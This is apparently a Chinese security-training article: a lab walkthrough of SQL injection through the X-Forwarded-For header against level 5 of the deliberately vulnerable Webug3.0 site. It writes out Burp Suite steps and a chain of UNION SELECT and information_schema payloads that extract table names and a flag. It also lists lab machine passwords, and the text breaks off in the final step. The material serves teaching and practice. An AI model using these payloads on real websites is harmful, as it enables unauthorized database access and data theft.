---
title: HTTP头部注入（下）
url: https://mp.weixin.qq.com/s/Bntzpw9YLAYfm3wCpPcZWQ
source: Doonsec's feed
date: 2026-05-23
fetch_date: 2026-05-24T05:59:44.137819
---

# HTTP头部注入（下）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/QJTLZsy5trFyMfScVbFsoZOicxx48DuAah2guoJR91fXALf0ia9lMEqwHsiaKzhJdlqicxicP8SKtpCKQd261qRTYSsAyKBOibe6ozahBaKFdFyf0/0?wx_fmt=jpeg)

# HTTP头部注入（下）

原创

建哥聊安全
建哥聊安全

建哥聊安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# **免责声明：****严格禁止**对任何未授权系统/网络进行扫描、攻击或入侵。 禁止制作/传播恶意程序，禁止参与任何网络犯罪。如擅自将本文实验技术用于非法用途，一切法律后果及责任由行为人独立承担，与作者无关。****

# **SQL注入-HTTP头部注入2**

## **实验目的**

理解HTTP头部字段User-Agent、Referer、Cookie、X-Forwarded-For等的含义和作用，掌握HTTP头部注入的原理、方法及基本流程。

## **实验环境**

#### **攻击机：Pentest-Atk**

（1）操作系统：Windows 10

（2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等

（3）登录账号密码：操作系统账号Administrator，密码Sangfor!7890

#### **靶机：A-SQLi-Labs**

（1）操作系统：CentOS 7

（2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境

（3）登录账号密码：操作系统账号root，密码Sangfor!7890

## **实验原理**

有时候，后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（比如User-Agent、Accept字段等），会对客户端HTTP Header进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。
常见的HTTP Header注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等。

## **实验步骤**

#### **本实验的目标是：以Webug3.0网站的第五关为入口，利用报错注入的方式实施SQL注入，获取网站后台数据库中存放的flag。**

#### **1．访问Webug网站**

在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的Webug网站。访问的URL为：

http://[靶机IP]/webug/

(注意大小写)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFSITBPHGtZF1L6IQmr7BXZ8M7gWALd9pzJEmibgH62Z5edHYaFA1HRmDpvTJHZro7rO0IBjpN1RGmw3vfnFD2JjNOuoXnDU0IY/640?wx_fmt=png&from=appmsg)

#### **2．利用Burpsuite工具抓包**

（1）启动Burpsuite

在攻击机Pentest-Atk的桌面文件夹Burp中，鼠标左键双击BURP.cmd程序，启动Burpsuite。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trEEE295ib8jA3rhab6Jic47vmudYtraXiazxf4jQqFf7M1lJe5Ribdpn4V50bwIITTyM5DQmJichDPs9oy9MjoVDCOcfwt0w6GWicFbc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trHsWLpLXnoAibiar6G34pqrNd9IASekS809PhvFvvibe1kSAhlAJytAn9PiaS2Mj3zO54agxlFc0RW76jsk0ibtMAtlE7gRPySXDg6s/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHHguXcLLnlxibBEWg9cEPo0g6XEhKrcwQicyxVJXHGlicD4Cgdq1J9V3iaZ3sSjLHsyapOtYqMry9IoAF48ia2OGNzeXjS6Ihqf41o/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFiaZibxUSI7Q4wOiaj8Ze9bvNTdMIYxdj7t2PRCWiaMU6jxkH2yoXK01l9FelOLb3LBh4toVLjNIWWnRWiaomdkM2AaemI2SiaOcOI4/640?wx_fmt=png&from=appmsg)

（2）设置Burpsuite的代理服务端口

在Burpsuite软件界面上选择选项卡“Proxy”->“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8080（此为Burpsuite默认的服务端口）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trH8wcJDAUYGhM6R3pVib5eEvM2WNPywTpXSOLQevBbkDpCuj244Diayn1CxK17cYyliaPaxQE7l2K2iaAzDtHsia3GDPY9GeQ5bSMY4/640?wx_fmt=png&from=appmsg)

（3）开启Burpsuite的代理拦截功能

在Burpsuite软件界面上选择选项卡“Proxy”->“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trHNrLSNhfQCujPGFMwIpC36GrqdnsKj4rGIJn4XY8m5B4YvvyeVLWo2FN4yPZgR79lCdWQVoiaY1XYK29iagB51Bqo84uFLjcMXc/640?wx_fmt=png&from=appmsg)

注意：上述设置完成之后，不要关闭Burpsuite！

（4）设置Firefox代理

回到FireFox浏览器界面，鼠标右键单击浏览器地址栏右方的FoxyProxy插件图标按钮，在弹出的菜单中选择“为全部URLs启用代理服务器127.0.0.1:8080”:

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHqU3FQlrOunFia5icU842n1Y7jj4lw4WoxAFkqX1lU0ChWJNqcfd1vZLedSOTStz61kFoMSgKHsowyXlibOibDWmN6wB3bLxgCfico/640?wx_fmt=png&from=appmsg)

代理设置成功后，FoxyProxy插件图标会变成蓝色。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trF7a5K16StcsXicAsHhcg87eVcdjibpd05MU9N4coAKdeR9VwKyCPcibudRuEgKJhA3iaA87uiaG2llictmyo8VJhNemDJYprG9ytZqM/640?wx_fmt=png&from=appmsg)

（5）利用Burpsuite工具拦截HTTP请求包

在Webug网站主页选择第五关（“头部的一个注入”）：

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trEXCGjxIAictJich5xmqQicoMgMMM41A5bUT7n9bEvaJlpSJtyY2UQL1FpW4ZLO40Zicdtgr1E0lmguPwL5Nn7kg8r8ov4icDlU1r38/640?wx_fmt=png&from=appmsg)

此时Burpsuite会拦截到HTTP请求包：

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trERRQvSmSlEwEnrfBu6ksApe8EmBiaUNCfQbCeTibfb4EbO2aw5wcNWCrNe7XticNUzjymV96Nm1sc9qT5zmuoKkCicuYLe35zdOwc/640?wx_fmt=png&from=appmsg)

（6）将Burpsuite工具拦截到的HTTP请求包发送至Repeater模块

选中拦截到的HTTP请求包全部内容，单击鼠标右键，在弹出的菜单中选择“Send to Repeater”，将其发送给Burpsuite的Repeater模块。

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trG0VicwClOIv25DdDK1PfFExNvdF2k3VZQ59hibWLoUSiaQrRAOiam2g88DjqWgicFZ20zglMU4zyAJRZWiaFWeeQ3CvKBDQxKSia7hiaE/640?wx_fmt=png&from=appmsg)

发送成功后，在Burpsuite的Repeater选项卡下能够看到刚刚拦截的HTTP请求包内容。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trEyZovdXdweZXtO3LoexC3nXRS9bj80dO7Emhx55zC58RIrklsPaI0QBCOC7R1CHiaH8Uesuiau8qM83llbZyoM7hGn0fEXxtWIE/640?wx_fmt=png&from=appmsg)

后续的步骤中，可以在Repeater选项卡下的Request栏中设置注入的payload，设置完成后点击Send按钮发送，并在Response栏中观察目标服务器的响应。

#### **3．寻找注入点**

（1）对拦截到的HTTP请求包不做任何修改，直接点击Send发送，此时Response->Pretty下显示的内容：

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trEprLVte0222RrYNHeZGbqmMibVItsqbHEdiayjYyf0Uxecj8E2Q7WibRx2z3TNojb0icIZdopNGQkSoMkGnicgds8olNNaiaHibWBOJQ/640?wx_fmt=png&from=appmsg)

Response->Render下显示的内容：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGicMib9sz2DCiaYHQ5icYeYNKbHfBvw5QwwJyhZkQFb52pDfY0hOLicjKgzWfA8YIlB9LCC7pTPA6lJWBYtvaa7DgE2g8WZtlSdv98/640?wx_fmt=png&from=appmsg)

（2）在原始的HTTP请求包中添加头部字段X-Forwarded-For，并使用如下payload：

X-Forwarded-For:a'

此时，服务器端报错！

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trEJ3vBwYiahN3wX3PMOL9bwJSnyibib5z0c2d4Xibvee5yIicxTsAr24fibmXaBBBPicOHQNJwBEKVTEZ9MUzoydEQlB4dUTF74bDHxgc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trF2CHz9YU3ESD8SamSQnnyv3uB07rd2R6MGyaD2lyiaw1AJDUhZR2f95VwtsPm1gkxcvmIO5wv7MR7CUoCy9zdvk83PygISxsTo/640?wx_fmt=png&from=appmsg)

由此可以判断，目标网站在头部字段XFF处存在注入点。

#### **4．判断网站查询的字段数**

使用如下payload判断网站查询的字段数：

X-Forwarded-For:order by 2

未报错！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trFicafRSNbkicJsAVF7xFTTyMStiaEsyN3MDLzrUnYxg1G35cs1I4hDTPwsuTGcibFRNszjbMovCxuT0aV3Ax3rwkXzxdSrJXibmOJ4/640?wx_fmt=png&from=appmsg)

X-Forwarded-For:order by 3

未报错！

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHdLYUVfribcV8mLqEZeibVIGZ6Mpfhic3nNOt1LcbI3ibUyJ4ox8d9CtCicWNLhBKVTw8cn0r1AeZZu6qMY8K2icLpTOqIxhgh94ahU/640?wx_fmt=png&from=appmsg)

X-Forwarded-For:order by 4

未报错！

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFu92ibOJE9ctqCTOuYM4qfQ3AL0BEV2a7kzrcmJ5IB7ZemgQc0XBT0djVwwRJiaJFKrw5EgNbdVbOJIDEwGc6Ng14cdIKSs7QuI/640?wx_fmt=png&from=appmsg)

X-Forwarded-For:order by 5

报错！

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trGQmfo8wwRs5gibibYlPSxLdItrPcmgGicNpjy31rDXxN0RiaonVxoFqUibjiaDrwkM4kYKFNa7nn9ULSHGXicJu92gsy9gv646DSiaVn0/640?wx_fmt=png&from=appmsg)

由上述结果可以判断，网站查询的字段数为4。

#### **5．判断网站的回显位置**

使用如下payload判断网站的回显位置：

X-Forwarded-For:union select 1,2,3,4

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trE7gNh3yYvXv3meI4VvSJUnMHrcbxTq75JHYgdggyXiaJ5bsvvr55QB8D5LEWlWyqkRdDufuFgsfqbQUnVpBF6BNZ6uIm1pvUd8/640?wx_fmt=png&from=appmsg)

由上述结果可以判断，网站有三个回显位置：2号位、3号位和4号位。

#### **6．获取网站当前所在的数据库的库名**

使用如下payload获取网站当前所在的数据库的库名：

X-Forwarded-For:union select 1,database(),3,4

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHic3icks7frn9ia3nttTVLicZCMpmouicpXyicAvV86ZjudE8zZ2uqFhtnRd4vrvYQD7eHEUiaWZh0avVPVscc8LmA7ibdvprdkV5krsE/640?wx_fmt=png&from=appmsg)

由上述结果可以得知，网站当前所在的数据库的库名为pentesterlab。

#### **7．获取pentesterlab数据库中所有的表名**

使用如下payload获取pentesterlab数据库中所有的表名：

X-Forwarded-For:union select 1,group\_concat(table\_name),3,4 from information\_schema.tables where table\_schema='pentesterlab'

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGwLrMfJsic59aBmyXvDqykEMCLRP5DfI8aicsibPDXbcJRZ2xwn88e4eu2OP3PiaNGyBHM8f9zjtEATST22iciclV8dRYicMcBRFdibM0/640?wx_fmt=png&from=appmsg)

由上述结果可以得知，pentesterlab数据库中含有comment、flag、goods和user四张表。其中，flag表中可能存放着flag信息。

#### **8．获取flag表中的字段名**

使用如下payload获取flag表中的字段名：

X-Forwarded-For:union select 1,group\_concat(column\_name),3,4 from information\_schema.columns where table\_schema='pentesterlab' and table\_name='flag'

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trESCUlmTSniajke5JnYKfg8nPjazdCYsQR8GQmuPPsy7xT2zsPWBibtKO2BC9MTNiacsssrYZSvkZ5DZcMia2SwX80Is1F3648vnxw/640?wx_fmt=png&from=appmsg)

由上述结果可以得知，flag表中有两个字段id、flag。

#### **9．获取flag表中的flag字段的内容**

使用如下payload获取flag表中的flag字段的内容：

X-Forwarded-For:union select 1,flag,3,4 from pentesterlab.flag

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFLCgybXTI78V15M320xvFcSTbrFKWNCFxdKIqynprTcsFkdgLSyIB9pRC8btnC6Bv7JXF...